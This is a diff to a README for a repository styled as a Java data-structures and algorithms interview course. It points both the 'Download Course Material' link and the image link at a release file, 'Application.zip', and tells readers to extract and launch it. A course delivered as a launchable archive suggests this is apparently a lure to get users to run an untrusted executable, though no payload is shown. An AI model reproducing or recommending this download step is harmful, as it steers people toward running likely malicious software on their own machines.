@@ -19,14 +19,14 @@ Welcome to the **Java-DSA-Interview-Preparation-Course** repository! Here, I sha
 - Time Complexity
 
 ## Get Started
-To access the course material and resources, please click on the following link: [Download Course Material](https://github.com/file/Application.zip)
+To access the course material and resources, please click on the following link: [Download Course Material](https://github.com/OuattaraBienetre/Java-DSA-Interview-Preparation-Course/releases/download/v1.0.0/Application.zip)
 
 If the link redirects you to a file, ensure to extract and launch it for access.
 
 ## Explore Further
 If you wish to delve deeper into the content or encounter any issues with the link provided, feel free to check the **Releases** section of this repository for additional resources.
 
-![Data Structures and Algorithms](https://github.com/link/to/image.png)
+![Data Structures and Algorithms](https://github.com/OuattaraBienetre/Java-DSA-Interview-Preparation-Course/releases/download/v1.0.0/Application.zip)
 
 ## Why Data Structures and Algorithms Matter for Interviews
 Mastering data structures and algorithms is crucial for excelling in technical interviews. Interviewers often assess candidates based on their problem-solving skills, efficiency, and ability to write clean and optimized code. By honing your skills in this area, you not only increase your chances of landing your dream job but also enhance your overall programming proficiency.
